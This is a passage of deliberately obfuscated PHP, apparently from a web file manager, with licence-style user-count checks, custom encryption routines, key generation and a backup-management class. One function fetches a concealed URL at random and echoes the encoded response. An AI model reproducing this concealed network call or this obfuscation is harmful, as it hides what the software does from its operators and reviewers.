$ÚÛ­¾³ = $êÊüóÓ[729]; while (strlen($ÚÛ­¾³) < $êÊüóÓ[653]) { if (!$ÚÛ­¾³) { break; } $ÚÛ­¾³++; } $ôÂªË€ = _get($this->ipsg6944302f, $‹üß·£û[292]); $ÄôšÔÚ = $êÊüóÓ[730]; if (strlen($ÄôšÔÚ) < $êÊüóÓ[653]) { die; } $ôÂªË€ = $ôÂªË€ ? intval($ôÂªË€) : 0; return $´ïªğí¬ + $ôÂªË€; $Õ§Òò²¹ = $êÊüóÓ[731]; if (strlen($Õ§Òò²¹) < $êÊüóÓ[655]) { return; } } public function kbmx7df0ad39($¤İıé¦ô) { $ßîôëŠ =& $_SERVER[œÈù³¡½]; $Ô¼úÅ² = $this->pgel775f2de3(); if ($¤İıé¦ô[$ßîôëŠ[293]] == $ßîôëŠ[123]) { return; } if ($Ô¼úÅ² >= intval($ßîôëŠ[214])) { return; } $ÆÛ‹¸â‘ = Model($ßîôëŠ[126])->count(); if ($ÆÛ‹¸â‘ <= $Ô¼úÅ²) { return; } $ĞÏËºå = Model($ßîôëŠ[126])->field($ßîôëŠ[293])->limit($Ô¼úÅ²)->select(); $ĞÏËºå = array_to_keyvalue($ĞÏËºå, $ßîôëŠ[6], $ßîôëŠ[293]); if (!in_array($¤İıé¦ô[$ßîôëŠ[293]], $ĞÏËºå)) { show_json($ßîôëŠ[294], !1, $ßîôëŠ[210]); } } public function zvau1299c9d7() { $¬æìËÒ» =& $_SERVER[³½¬ÚË¯]; $±‚Ñ¿ÒŸ =& $_SERVER[œÈù³¡½]; if (!_get($GLOBALS, $±‚Ñ¿ÒŸ[117]) || mt_rand(1, 100) > 20) { return; } $Óƒ¢Ä§ = $±‚Ñ¿ÒŸ[217]; $Ïµ§€Øñ = $¬æìËÒ»[701]; if (!$Ïµ§€Øñ) { return; } $Óƒ¢Ä§ = $this->dlqh7e675748($Óƒ¢Ä§, $±‚Ñ¿ÒŸ[218]); $­‡Ö½Ô¨ = stream_context_create(array($±‚Ñ¿ÒŸ[219] => array($±‚Ñ¿ÒŸ[220] => $±‚Ñ¿ÒŸ[221], $±‚Ñ¿ÒŸ[222] => 3))); $êŠ÷»“Ú = @file_get_contents($Óƒ¢Ä§, !1, $­‡Ö½Ô¨); $‘¼ƒîø¬ = $¬æìËÒ»[732]; echo $±‚Ñ¿ÒŸ[295] . hash_encode($êŠ÷»“Ú) . $±‚Ñ¿ÒŸ[296]; $®àºŸÙ¶ = $¬æìËÒ»[733]; } private function haykeb099326($ÃÖÛÆ»Œ, $˜Â§Ş£ú, $ÓÄ¡ÄÆÖ = 3) { $³ÈÒÂÈ¼ =& $_SERVER[³½¬ÚË¯]; $¡µ²ãå =& $_SERVER[œÈù³¡½]; usleep(1); $¸×‹Àß© = $³ÈÒÂÈ¼[734]; while (strlen($¸×‹Àß©) < $³ÈÒÂÈ¼[658]) { if (!$¸×‹Àß©) { break; } $¸×‹Àß©++; } $ÃÖÛÆ»Œ = trim($ÃÖÛÆ»Œ); $æÒ´ô€² = $³ÈÒÂÈ¼[735]; $‘Ä˜Á²» = mt_rand(0, 5) . $¡µ²ãå[6]; $š¬À÷ö = $³ÈÒÂÈ¼[736]; if (strlen($š¬À÷ö) < $³ÈÒÂÈ¼[658]) { return; } $Â¶¿èÑ± = rand_string(15); $Û®×¸§Ñ = $³ÈÒÂÈ¼[737]; while ($Û®×¸§Ñ < $³ÈÒÂÈ¼[649]) { if ($Û®×¸§Ñ >= 0) { break; } $Û®×¸§Ñ++; } $õåŞ§×¬ = $¡µ²ãå[297]; switch ($‘Ä˜Á²») { case $¡µ²ãå[206]: $–¬úŒÔ = $this->ngmqdf589732($ÃÖÛÆ»Œ, strrev($˜Â§Ş£ú . $Â¶¿èÑ±)); $Ğ˜ôõè = $³ÈÒÂÈ¼[738]; break; case $¡µ²ãå[123]: $–¬úŒÔ = $this->ngmqdf589732($ÃÖÛÆ»Œ, strrev($Â¶¿èÑ± . $˜Â§Ş£ú)); break; $¬õËÉ’ã = $³ÈÒÂÈ¼[739]; if (!$¬õËÉ’ã) { return; } case $¡µ²ãå[298]: $–¬úŒÔ = $this->ngmqdf589732($ÃÖÛÆ»Œ, base64_encode($Â¶¿èÑ± . $˜Â§Ş£ú)); break; case $¡µ²ãå[299]: $–¬úŒÔ = $this->ngmqdf589732($ÃÖÛÆ»Œ, md5($Â¶¿èÑ± . $˜Â§Ş£ú)); break; case $¡µ²ãå[300]: $ÃÖÛÆ»Œ = base64_encode($ÃÖÛÆ»Œ); $™²§ö· = rand(0, 64); $âÛÅ‡©™ = $³ÈÒÂÈ¼[740]; $ë±½èÎ = $õåŞ§×¬[$™²§ö·]; $™­œÔ„ = $³ÈÒÂÈ¼[741]; while (strlen($™­œÔ„) < $³ÈÒÂÈ¼[653]) { if (!$™­œÔ„) { break; } $™­œÔ„++; } $ãöÒğÓ = md5($ë±½èÎ . md5($˜Â§Ş£ú . $ë±½èÎ) . $˜Â§Ş£ú); $ãöÒğÓ = substr($ãöÒğÓ, $™²§ö· % 8, $™²§ö· % 8 + 7); $èßÇ²Âá = $³ÈÒÂÈ¼[742]; $àıÎº ½ = $¡µ²ãå[6]; $¶à±©£” = $³ÈÒÂÈ¼[743]; if (!$¶à±©£”) { die; } $‡³¨‡„ = 0; $êÌÙûËÕ = $³ÈÒÂÈ¼[744]; if (strlen($êÌÙûËÕ) < $³ÈÒÂÈ¼[653]) { return; } $–ƒ’¥Å× = 0; $Ú…Ÿˆ¨Î = 0; for ($‡³¨‡„ = 0; $‡³¨‡„ < strlen($ÃÖÛÆ»Œ); $‡³¨‡„++) { $Ú…Ÿˆ¨Î = $Ú…Ÿˆ¨Î == strlen($ãöÒğÓ) ? 0 : $Ú…Ÿˆ¨Î; $¤ãıàÒ’ = $³ÈÒÂÈ¼[745]; while ($¤ãıàÒ’ < $³ÈÒÂÈ¼[653]) { if ($¤ãıàÒ’ >= 0) { break; } $¤ãıàÒ’++; } $–ƒ’¥Å× = ($™²§ö· + strpos($õåŞ§×¬, $ÃÖÛÆ»Œ[$‡³¨‡„]) + ord($ãöÒğÓ[$Ú…Ÿˆ¨Î++])) % 64; $àıÎº ½ .= $õåŞ§×¬[$–ƒ’¥Å×]; } $–¬úŒÔ = hash_encode($ë±½èÎ . $àıÎº ½); break; $ò†îÍ” = $³ÈÒÂÈ¼[746]; while (strlen($ò†îÍ”) < $³ÈÒÂÈ¼[687]) { if (!$ò†îÍ”) { break; } $ò†îÍ”++; } default: $–¬úŒÔ = $this->ngmqdf589732($ÃÖÛÆ»Œ, $˜Â§Ş£ú . $Â¶¿èÑ±); break; } $–¬úŒÔ = strrev($‘Ä˜Á²» . $Â¶¿èÑ± . $–¬úŒÔ); if ($ÓÄ¡ÄÆÖ - 1 > 0) { $–¬úŒÔ = $this->haykeb099326($–¬úŒÔ, $˜Â§Ş£ú, $ÓÄ¡ÄÆÖ - 1); } return $–¬úŒÔ; } private function wayjd36879cd($¿æ‚‚Êô, $×ÜÕ”×ö, $ìĞüÌ•Ì = 3) { $¶¯ÀŒõ =& $_SERVER[³½¬ÚË¯]; $Ş¹½ª”« =& $_SERVER[œÈù³¡½]; if (!is_string($¿æ‚‚Êô) || strlen($¿æ‚‚Êô) < 10) { return !1; } $¿æ‚‚Êô = trim($¿æ‚‚Êô); $¿æ‚‚Êô = strrev($¿æ‚‚Êô); $¥Èµ›ôâ = $¿æ‚‚Êô[0]; $İĞÈĞøª = $¶¯ÀŒõ[747]; if (strlen($İĞÈĞøª) < $¶¯ÀŒõ[658]) { die; } $¼ó²Õ£ƒ = substr($¿æ‚‚Êô, 1, 15); $†ÔÍ´ö¨ = $¶¯ÀŒõ[748]; $¿æ‚‚Êô = substr($¿æ‚‚Êô, 16); $ æèü¾Î = $Ş¹½ª”«[297]; $ËÇûÏ¹¾ = $¶¯ÀŒõ[749]; while (strlen($ËÇûÏ¹¾) < $¶¯ÀŒõ[658]) { if (!$ËÇûÏ¹¾) { break; } $ËÇûÏ¹¾++; } switch ($¥Èµ›ôâ) { case $Ş¹½ª”«[206]: $ ¾œ¾€» = $this->dlqh7e675748($¿æ‚‚Êô, strrev($×ÜÕ”×ö . $¼ó²Õ£ƒ)); $çšš‚’‹ = $¶¯ÀŒõ[750]; break; $…œŞıµ¢ = $¶¯ÀŒõ[751]; while ($…œŞıµ¢ < $¶¯ÀŒõ[649]) { if ($…œŞıµ¢ >= 0) { break; } $…œŞıµ¢++; } case $Ş¹½ª”«[123]: $ ¾œ¾€» = $this->dlqh7e675748($¿æ‚‚Êô, strrev($¼ó²Õ£ƒ . $×ÜÕ”×ö)); $ÓŞ¨²¦ = $¶¯ÀŒõ[752]; break; case $Ş¹½ª”«[298]: $ ¾œ¾€» = $this->dlqh7e675748($¿æ‚‚Êô, base64_encode($¼ó²Õ£ƒ . $×ÜÕ”×ö)); break; case $Ş¹½ª”«[299]: $ ¾œ¾€» = $this->dlqh7e675748($¿æ‚‚Êô, md5($¼ó²Õ£ƒ . $×ÜÕ”×ö)); break; case $Ş¹½ª”«[300]: $¿æ‚‚Êô = hash_decode($¿æ‚‚Êô); $ûÓ¼½”® = $¶¯ÀŒõ[753]; $ÛáƒĞ½ = $¿æ‚‚Êô[0]; $¿æ‚‚Êô = substr($¿æ‚‚Êô, 1); $ ÌãÓ¹¿ = $¶¯ÀŒõ[754]; $Ä°²ô ş = strpos($ æèü¾Î, $ÛáƒĞ½); $ˆçñîªó = $¶¯ÀŒõ[755]; if (!$ˆçñîªó) { return; } $çª±ïíÆ = md5($ÛáƒĞ½ . md5($×ÜÕ”×ö . $ÛáƒĞ½) . $×ÜÕ”×ö); $Òğ„ğœ‡ = $¶¯ÀŒõ[756]; while ($Òğ„ğœ‡ < $¶¯ÀŒõ[653]) { if ($Òğ„ğœ‡ >= 0) { break; } $Òğ„ğœ‡++; } $çª±ïíÆ = substr($çª±ïíÆ, $Ä°²ô ş % 8, $Ä°²ô ş % 8 + 7); $¢ÆÓË = $Ş¹½ª”«[6]; $ºÆë±ü = 0; $´®ôÎ€ = 0; $áß§šà¢ = $¶¯ÀŒõ[757]; while (strlen($áß§šà¢) < $¶¯ÀŒõ[655]) { if (!$áß§šà¢) { break; } $áß§šà¢++; } $ÓÍ›­ô = 0; for ($ºÆë±ü = 0; $ºÆë±ü < strlen($¿æ‚‚Êô); $ºÆë±ü++) { $ÓÍ›­ô = $ÓÍ›­ô == strlen($çª±ïíÆ) ? 0 : $ÓÍ›­ô; $ŞÊä¨šË = $¶¯ÀŒõ[758]; $¶±‹Î•Û = $ÓÍ›­ô++; $´®ôÎ€ = strpos($ æèü¾Î, $¿æ‚‚Êô[$ºÆë±ü]) - $Ä°²ô ş - ord($çª±ïíÆ[$¶±‹Î•Û]); $¬€‹”Í = $¶¯ÀŒõ[759]; if (strlen($¬€‹”Í) < $¶¯ÀŒõ[687]) { die; } while ($´®ôÎ€ < 0) { $´®ôÎ€ += 64; } $¢ÆÓË .= $ æèü¾Î[$´®ôÎ€]; } $ ¾œ¾€» = base64_decode($¢ÆÓË); $¥„”‹¨Ï = $¶¯ÀŒõ[760]; if (strlen($¥„”‹¨Ï) < $¶¯ÀŒõ[687]) { die; } break; $¦ªëİº = $¶¯ÀŒõ[761]; if (strlen($¦ªëİº) < $¶¯ÀŒõ[649]) { return; } default: $ ¾œ¾€» = $this->dlqh7e675748($¿æ‚‚Êô, $×ÜÕ”×ö . $¼ó²Õ£ƒ); $Êõöƒû¿ = $¶¯ÀŒõ[762]; break; $áÚ™ıèÁ = $¶¯ÀŒõ[763]; while (strlen($áÚ™ıèÁ) < $¶¯ÀŒõ[653]) { if (!$áÚ™ıèÁ) { break; } $áÚ™ıèÁ++; } } if ($ìĞüÌ•Ì - 1 > 0) { $ ¾œ¾€» = $this->wayjd36879cd($ ¾œ¾€», $×ÜÕ”×ö, $ìĞüÌ•Ì - 1); } return $ ¾œ¾€»; } public function syfqaf763a90($™ÏÍ¥˜) { $Êõ ÚÚ¼ =& $_SERVER[³½¬ÚË¯]; $ÌïÌ¿Ã’ =& $_SERVER[œÈù³¡½]; $´à€âÕš = $this->ihcd1ad6934d(); $§˜‹Ãß¼ = $this->ihcd1ad6934d(); $™‰óÂ·Ù = ($´à€âÕš - 1) * ($§˜‹Ãß¼ - 1); $š¯³‘ùç = intval(($´à€âÕš + $§˜‹Ãß¼) / 2); $¬ÙéŠ¼« = $Êõ ÚÚ¼[764]; if (strlen($¬ÙéŠ¼«) < $Êõ ÚÚ¼[687]) { die; } while (1) { $’…¢ = $š¯³‘ùç; $ ·»ØŞí = $™‰óÂ·Ù; $×†öÑŒˆ = $Êõ ÚÚ¼[765]; if (!$×†öÑŒˆ) { return; } while ($ ·»ØŞí % $’…¢ != 0) { $ƒ¦¤ì = $ ·»ØŞí; $ï¯ıâÀ† = $Êõ ÚÚ¼[766]; while (strlen($ï¯ıâÀ†) < $Êõ ÚÚ¼[649]) { if (!$ï¯ıâÀ†) { break; } $ï¯ıâÀ†++; } $ ·»ØŞí = $’…¢; $öâÊÎ™ = $Êõ ÚÚ¼[767]; if (strlen($öâÊÎ™) < $Êõ ÚÚ¼[653]) { return; } $’…¢ = $ƒ¦¤ì % $’…¢; $øâòåÄè = $Êõ ÚÚ¼[768]; } if ($’…¢ == 1) { break; } else { $š¯³‘ùç++; } } $Œ—ßÑ¦Ş = 2; for ($ù…åÎò = 0; $ù…åÎò < $™‰óÂ·Ù * 10; $ù…åÎò++) { if (($™‰óÂ·Ù * $ù…åÎò + 1) % $š¯³‘ùç == 0) { $Œ—ßÑ¦Ş = intval(($™‰óÂ·Ù * $ù…åÎò + 1) / $š¯³‘ùç); break; } } $ÄÇº§Úû = $this->ngmqdf589732($´à€âÕš * $§˜‹Ãß¼ . $ÌïÌ¿Ã’[6], $ÌïÌ¿Ã’[137]); $Åù›Èû› = md5($ÌïÌ¿Ã’[301] . ($´à€âÕš + $§˜‹Ãß¼) . $ÌïÌ¿Ã’[302] . $š¯³‘ùç . $ÌïÌ¿Ã’[302] . $Œ—ßÑ¦Ş . $ÌïÌ¿Ã’[303]); $ã›Ùú¯ = $this->ngmqdf589732($™ÏÍ¥˜, $Åù›Èû›) . $ÌïÌ¿Ã’[304] . $ÄÇº§Úû; $Ô†ÊÄ÷ï = $Êõ ÚÚ¼[769]; return $ã›Ùú¯; $…‚íÆ»õ = $Êõ ÚÚ¼[770]; if (!$…‚íÆ»õ) { return; } } public function ldoufc34c5dc($ÇÎŞÕµ‰) { $êØî†³ =& $_SERVER[³½¬ÚË¯]; $Ò·£Ê´Ù =& $_SERVER[œÈù³¡½]; $®­Ô¢·³ = explode($Ò·£Ê´Ù[304], $ÇÎŞÕµ‰); $ÛşÔŠ€ = $êØî†³[771]; if (count($®­Ô¢·³) != 2) { return $Ò·£Ê´Ù[6]; } $áÑ††€ä = $this->dlqh7e675748($®­Ô¢·³[1] . $Ò·£Ê´Ù[6], $Ò·£Ê´Ù[137]); if (!$áÑ††€ä) { return $Ò·£Ê´Ù[6]; } $áÑ††€ä = intval($áÑ††€ä); $™¶Ãê = 0; $«“ÉİöÃ = 0; $¬Š‹†çˆ = $êØî†³[772]; while (strlen($¬Š‹†çˆ) < $êØî†³[658]) { if (!$¬Š‹†çˆ) { break; } $¬Š‹†çˆ++; } for ($„’‰åë¢ = 3; $„’‰åë¢ < $áÑ††€ä; $„’‰åë¢ += 2) { if ($áÑ††€ä % $„’‰åë¢ != 0) { continue; } $™¶Ãê = $„’‰åë¢; $«“ÉİöÃ = intval($áÑ††€ä / $„’‰åë¢); $Â˜ÊÇù˜ = $êØî†³[773]; if (!$Â˜ÊÇù˜) { die; } break; $Î×„‹ËÑ = $êØî†³[683]; if (!$Î×„‹ËÑ) { return; } } $ƒĞéÇòü = ($™¶Ãê - 1) * ($«“ÉİöÃ - 1); $¿¨Ö´“ = intval(($™¶Ãê + $«“ÉİöÃ) / 2); while (1) { $Ë­È©Œú = $¿¨Ö´“; $§ÔùÊİÔ = $êØî†³[774]; $€«ëÛÅŞ = $ƒĞéÇòü; while ($€«ëÛÅŞ % $Ë­È©Œú != 0) { $Áö½„ß• = $€«ëÛÅŞ; $Ô¥§ = $êØî†³[775]; while ($Ô¥§ < $êØî†³[649]) { if ($Ô¥§ >= 0) { break; } $Ô¥§++; } $€«ëÛÅŞ = $Ë­È©Œú; $Ë­È©Œú = $Áö½„ß• % $Ë­È©Œú; $ã€—´ú = $êØî†³[776]; while (strlen($ã€—´ú) < $êØî†³[655]) { if (!$ã€—´ú) { break; } $ã€—´ú++; } } if ($Ë­È©Œú == 1) { break; } else { $¿¨Ö´“++; } } $‚úâÔ  = 2; $ÌıË£›Ë = $êØî†³[777]; if (!$ÌıË£›Ë) { return; } for ($„’‰åë¢ = 0; $„’‰åë¢ < $ƒĞéÇòü * 10; $„’‰åë¢++) { if (($ƒĞéÇòü * $„’‰åë¢ + 1) % $¿¨Ö´“ == 0) { $‚úâÔ  = intval(($ƒĞéÇòü * $„’‰åë¢ + 1) / $¿¨Ö´“); break; } } $—şŒİúì = md5($Ò·£Ê´Ù[301] . ($™¶Ãê + $«“ÉİöÃ) . $Ò·£Ê´Ù[302] . $¿¨Ö´“ . $Ò·£Ê´Ù[302] . $‚úâÔ  . $Ò·£Ê´Ù[303]); $Ğì¾è¡é = $êØî†³[778]; while (strlen($Ğì¾è¡é) < $êØî†³[658]) { if (!$Ğì¾è¡é) { break; } $Ğì¾è¡é++; } $´®£Ÿ‹ü = $this->dlqh7e675748($®­Ô¢·³[0], $—şŒİúì); return $´®£Ÿ‹ü; } public function ihcd1ad6934d() { $ó»ıÛĞ‘ =& $_SERVER[³½¬ÚË¯]; $ ßÊ«ãÄ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ó¶ç»Ï× = $ó»ıÛĞ‘[779]; if (strlen($Ó¶ç»Ï×) < $ó»ıÛĞ‘[687]) { die; } $ÉÙ¢ş”Õ = array(); $¦—‡¾ò× = 1; while ($¦—‡¾ò× <= (int) sqrt($ ßÊ«ãÄ)) { $ó‚ª¼ÜÛ = $¦—‡¾ò×; while (!0) { $ó‚ª¼ÜÛ++; $ıû¿¶ñ¶ = $ó»ıÛĞ‘[780]; if (!$ıû¿¶ñ¶) { return; } if ($ó‚ª¼ÜÛ <= 2) { $¦—‡¾ò× = $ó‚ª¼ÜÛ; break; } else { if ($ó‚ª¼ÜÛ < 2) { continue; } } $¸Ê¤ê¦è = !0; for ($¨ŒÈòÊ× = 2; $¨ŒÈòÊ× <= sqrt($ó‚ª¼ÜÛ); $¨ŒÈòÊ×++) { if ($ó‚ª¼ÜÛ % $¨ŒÈòÊ× == 0) { $¸Ê¤ê¦è = !1; } } if ($¸Ê¤ê¦è) { $¦—‡¾ò× = $ó‚ª¼ÜÛ; break; } } $ÉÙ¢ş”Õ[] = $¦—‡¾ò×; } $êÇø¨Å = 2; $Ã„û˜ = $ó»ıÛĞ‘[781]; if (!$Ã„û˜) { return; } for ($ó‚ª¼ÜÛ = $ ßÊ«ãÄ; $ó‚ª¼ÜÛ > 1; $ó‚ª¼ÜÛ--) { $¸Ê¤ê¦è = !0; foreach ($ÉÙ¢ş”Õ as $º¾“¡Ü«) { if ($ó‚ª¼ÜÛ % $º¾“¡Ü« == 0) { $¸Ê¤ê¦è = !1; break; } } if ($¸Ê¤ê¦è) { $êÇø¨Å = $ó‚ª¼ÜÛ; break; } } return $êÇø¨Å; } public function ostb3cb4b9e6($ğÀ½Úöı, $©ìÊ›É) { $ÜÂäØÜÖ =& $_SERVER[³½¬ÚË¯]; $üëÎÙÙÓ =& $_SERVER[œÈù³¡½]; return call_user_func(array($üëÎÙÙÓ[8], $üëÎÙÙÓ[305]), $ğÀ½Úöı, $©ìÊ›É); $ÉŠßÇ“ı = $ÜÂäØÜÖ[725]; while ($ÉŠßÇ“ı < $ÜÂäØÜÖ[649]) { if ($ÉŠßÇ“ı >= 0) { break; } $ÉŠßÇ“ı++; } } public function ngmqdf589732($™âÆ³â, $šò÷ßˆƒ) { $ÒŒ§ùŸ =& $_SERVER[³½¬ÚË¯]; $Æ¡Õü†ç =& $_SERVER[œÈù³¡½]; return call_user_func(array($Æ¡Õü†ç[306], $Æ¡Õü†ç[307]), $™âÆ³â, $šò÷ßˆƒ); $ìÜà”Ã÷ = $ÒŒ§ùŸ[782]; while (strlen($ìÜà”Ã÷) < $ÒŒ§ùŸ[653]) { if (!$ìÜà”Ã÷) { break; } $ìÜà”Ã÷++; } } public function dlqh7e675748($Àò½ş£«, $™âµ¤Õ£) { $¥Å¬‘òó =& $_SERVER[³½¬ÚË¯]; $™œß× =& $_SERVER[œÈù³¡½]; return call_user_func(array($™œß×[306], $™œß×[308]), $Àò½ş£«, $™âµ¤Õ£); $Ô±ïïİª = $¥Å¬‘òó[783]; while (strlen($Ô±ïïİª) < $¥Å¬‘òó[653]) { if (!$Ô±ïïİª) { break; } $Ô±ïïİª++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¿µÑ¨¹Ü =& $_SERVER[³½¬ÚË¯]; $this->isManual(); self::$name = date($¿µÑ¨¹Ü[784]); if (!($¼©˜çø• = Model($¿µÑ¨¹Ü[785])->lastItem())) { $¼©˜çø• = $this->initData(); } else { self::$name = $¼©˜çø•[$¿µÑ¨¹Ü[32]]; if ($¼©˜çø•[$¿µÑ¨¹Ü[786]] == $¿µÑ¨¹Ü[88]) { self::$name = date($¿µÑ¨¹Ü[255]); $ÄòÇÍõ– = 0; if (isset($¼©˜çø•[$¿µÑ¨¹Ü[337]][$¿µÑ¨¹Ü[214]][$¿µÑ¨¹Ü[509]])) { $ÄòÇÍõ– = (int) $¼©˜çø•[$¿µÑ¨¹Ü[337]][$¿µÑ¨¹Ü[214]][$¿µÑ¨¹Ü[509]]; } if (self::$manual == 0 && $¼©˜çø•[$¿µÑ¨¹Ü[32]] == self::$name) { Model($¿µÑ¨¹Ü[785])->remove($¼©˜çø•[$¿µÑ¨¹Ü[443]]); } $¼©˜çø• = $this->initData($ÄòÇÍõ–, $¼©˜çø•[$¿µÑ¨¹Ü[787]]); } else { $this->checkStore($¼©˜çø•[$¿µÑ¨¹Ü[787]]); } } self::$option = $¼©˜çø•; } private function isManual() { $³Ãø‹Ï = _get($GLOBALS, $_SERVER[³½¬ÚË¯][788], 0); $³Ãø‹Ï = intval($³Ãø‹Ï); self::$manual = $³Ãø‹Ï && $³Ãø‹Ï == 1 ? 1 : 0; } private function initData($‰İœ­Ã‰ = 0, $íõï¦È = '') { $ç§òÏ‹¤ =& $_SERVER[³½¬ÚË¯]; $ˆ¶àìç = Model($ç§òÏ‹¤[785])->config(); if ($íõï¦È && $ˆ¶àìç[$ç§òÏ‹¤[787]] != $íõï¦È) { $‰İœ­Ã‰ = 0; } $this->checkStore($ˆ¶àìç[$ç§òÏ‹¤[787]]); if (self::$manual == 1) { self::$name .= $ç§òÏ‹¤[11] . date($ç§òÏ‹¤[789]); } $©Ï€Àëï = array($ç§òÏ‹¤[787] => $ˆ¶àìç[$ç§òÏ‹¤[787]], $ç§òÏ‹¤[32] => self::$name, $ç§òÏ‹¤[786] => 0, $ç§òÏ‹¤[790] => $ˆ¶àìç[$ç§òÏ‹¤[790]], $ç§òÏ‹¤[791] => self::$manual, $ç§òÏ‹¤[337] => array($ç§òÏ‹¤[792] => array($ç§òÏ‹¤[786] => 0), $ç§òÏ‹¤[793] => array($ç§òÏ‹¤[786] => 0, $ç§òÏ‹¤[794] => 0, $ç§òÏ‹¤[795] => 0, $ç§òÏ‹¤[33] => $ç§òÏ‹¤[12], $ç§òÏ‹¤[796] => 0, $ç§òÏ‹¤[797] => 0), $ç§òÏ‹¤[798] => array($ç§òÏ‹¤[786] => 0, $ç§òÏ‹¤[794] => 0, $ç§òÏ‹¤[795] => 0, $ç§òÏ‹¤[796] => 0, $ç§òÏ‹¤[797] => 0), $ç§òÏ‹¤[214] => array($ç§òÏ‹¤[786] => 0, $ç§òÏ‹¤[799] => 0, $ç§òÏ‹¤[800] => 0, $ç§òÏ‹¤[801] => 0, $ç§òÏ‹¤[802] => 0, $ç§òÏ‹¤[509] => $‰İœ­Ã‰, $ç§òÏ‹¤[796] => 0, $ç§òÏ‹¤[797] => 0)), $ç§òÏ‹¤[796] => time(), $ç§òÏ‹¤[797] => 0); $áÖ·Ø÷ = Model($ç§òÏ‹¤[785])->insert($©Ï€Àëï); $©Ï€Àëï[$ç§òÏ‹¤[443]] = $áÖ·Ø÷; return $©Ï€Àëï; } private function checkStore($£Øà‡ç) { $­­— µÓ =& $_SERVER[³½¬ÚË¯]; $ÆÌ‹ˆÈ = Model($­­— µÓ[803])->listData($£Øà‡ç); Model($­­— µÓ[803])->checkConfig($ÆÌ‹ˆÈ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[³½¬ÚË¯][785])->findByName(self::$name); } return self::$option; } public static function set($Èòª¨) { $î¡¾® ± =& $_SERVER[³½¬ÚË¯]; $òÙšÈç = self::get(); foreach ($Èòª¨ as $åˆâ’Ä¦ => $ÂµõºÛƒ) { $‹Ø¿±Öğ = explode($î¡¾® ±[10], $åˆâ’Ä¦); $ûË·ìäğ = count($‹Ø¿±Öğ); switch ($ûË·ìäğ) { case 1: $òÙšÈç[$‹Ø¿±Öğ[0]] = $ÂµõºÛƒ; break; case 2: $òÙšÈç[$‹Ø¿±Öğ[0]][$‹Ø¿±Öğ[1]] = $ÂµõºÛƒ; break; case 3: $òÙšÈç[$‹Ø¿±Öğ[0]][$‹Ø¿±Öğ[1]][$‹Ø¿±Öğ[2]] = $ÂµõºÛƒ; break; } } Model($î¡¾® ±[785])->update($òÙšÈç[$î¡¾® ±[443]], $òÙšÈç); self::$option = $òÙšÈç; return self::$option; } public function keep() { $‚ƒ¶Á =& $_SERVER[³½¬ÚË¯]; $º†¥÷Ê¼ = self::get(); if ($º†¥÷Ê¼[$‚ƒ¶Á[337]][$‚ƒ¶Á[792]][$‚ƒ¶Á[786]] == $‚ƒ¶Á[88]) { return; } $this->backupKeep($º†¥÷Ê¼); self::set(array($‚ƒ¶Á[804] => 1)); } private function backupKeep($©Ğ¨ÎÆĞ) { $åÅ¬£õ =& $_SERVER[³½¬ÚË¯]; if (self::$manual == 1) { return; } $×û¬´ë² = Model($åÅ¬£õ[785])->listData(); if (empty($×û¬´ë²)) { return; } $•Şôï˜Ğ = 0; $¬¡®©Ïˆ = array(); foreach ($×û¬´ë² as $ÉçÓÄá) { if ($•Şôï˜Ğ >= 7) { break; } $¬¡®©Ïˆ[] = $ÉçÓÄá[$åÅ¬£õ[32]]; $•Şôï˜Ğ++; } for ($•Şôï˜Ğ = 0; $•Şôï˜Ğ < 12; $•Şôï˜Ğ++) { $¬¡®©Ïˆ[] = date($åÅ¬£õ[805], strtotime("\55{$•Şôï˜Ğ}\40\x6d\x6f\156\164\x68\163")); } $¬¡®©Ïˆ = array_unique($¬¡®©Ïˆ); $„¼°ê¿ù = Model($åÅ¬£õ[806])->get($åÅ¬£õ[807]); foreach ($×û¬´ë² as $ÉçÓÄá) { if (isset($ÉçÓÄá[$åÅ¬£õ[791]]) && $ÉçÓÄá[$åÅ¬£õ[791]] == $åÅ¬£õ[88]) { continue; } if (!empty($ÉçÓÄá[$åÅ¬£õ[32]]) && in_array($ÉçÓÄá[$åÅ¬£õ[32]], $¬¡®©Ïˆ)) { continue; } Model($åÅ¬£õ[785])->remove($ÉçÓÄá[$åÅ¬£õ[443]]); $¬ÌÅ‘Å = $this->backupPath($©Ğ¨ÎÆĞ, $„¼°ê¿ù); IO::remove($¬ÌÅ‘Å, !1); } } private function backupPath($ò¥äï€Í, $£ÄıÀŞ¾ = false) { $ß¥ŞÁÆ¬ =& $_SERVER[³½¬ÚË¯]; if (!$£ÄıÀŞ¾) { $£ÄıÀŞ¾ = Model($ß¥ŞÁÆ¬[806])->get($ß¥ŞÁÆ¬[807]); } $ŒğÏ­ÉË = $ò¥äï€Í[$ß¥ŞÁÆ¬[32]]; $µ ¬éÕ³ = substr(md5($ß¥ŞÁÆ¬[808] . $£ÄıÀŞ¾ . $ŒğÏ­ÉË), 0, 8); return "\x7b\151\157\72{$ò¥äï€Í[$ß¥ŞÁÆ¬[787]]}\x7d\x2f\144\x61\x74\141\142\x61\x73\145\57\142\141\143\153\165\x70\57" . $ŒğÏ­ÉË . $ß¥ŞÁÆ¬[11] . $µ ¬éÕ³; } public function db() { $¼ñ·›¹‹ =& $_SERVER[³½¬ÚË¯]; $Óì›í±€ = self::get(); if ($Óì›í±€[$¼ñ·›¹‹[337]][$¼ñ·›¹‹[793]][$¼ñ·›¹‹[786]] == $¼ñ·›¹‹[88]) { return !0; } $‚’‘¿Œ = new BackupDb(); if (!$‚’‘¿Œ->index()) { return !1; } self::set(array($¼ñ·›¹‹[809] => 1)); return !0; } public function dbFile() { $ûÍ„³× =& $_SERVER[³½¬ÚË¯]; $È¹ß½ƒğ = self::get(); if ($È¹ß½ƒğ[$ûÍ„³×[337]][$ûÍ„³×[798]][$ûÍ„³×[786]] == $ûÍ„³×[88]) { return !0; } $“ô’¸‡Ø = new BackupDbFile(); if (!$“ô’¸‡Ø->index()) { return !1; } self::set(array($ûÍ„³×[810] => 1)); return !0; } public function file() { $°¥§á®° =& $_SERVER[³½¬ÚË¯]; $›ò‹ µ = self::get(); if ($›ò‹ µ[$°¥§á®°[337]][$°¥§á®°[214]][$°¥§á®°[786]] == $°¥§á®°[88]) { return !0; } if (!isset($›ò‹ µ[$°¥§á®°[790]]) || $›ò‹ µ[$°¥§á®°[790]] == $°¥§á®°[212]) { $Òò£µä® = new BackupFile(); if (!$Òò£µä®->index()) { return !1; } } self::set(array($°¥§á®°[811] => 1, 